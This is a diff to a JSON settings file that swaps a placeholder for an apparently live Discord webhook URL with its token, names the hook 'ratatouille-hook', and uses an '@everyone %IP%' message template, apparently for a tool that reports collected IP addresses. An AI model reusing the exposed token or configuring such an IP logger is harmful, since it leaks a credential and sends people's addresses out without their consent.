@@ -1,7 +1,7 @@
 {
-  "webhook": "YOUR WEBHOOK URL HERE",
-  "webhook_name": "Webhook",
-  "webhook_avatar": "https://cdn.discordapp.com/embed/avatars/0.png",
+  "webhook": "https://discord.com/api/webhooks/1261509306067456101/jASkV0Nvbk7CbdPEoK_ZVwMYo58wPPrfVBzgcP6bXxfr-cV4qm3SpZ7Z7Vh8Hfqlxd8o",
+  "webhook_name": "ratatouille-hook",
+  "webhook_avatar": "https://cdn.discordapp.com/attachments/1261506670811414555/1261512373957562429/Screenshot_2024-06-05_220310.jpg?ex=66933a73&is=6691e8f3&hm=828f42c21a4b89c8d22141cd885fb837e90ff98d3405c774d2b389faa5c45fd9&",
   "message": "@everyone %IP%",
 
   "codeblock_type": "small",
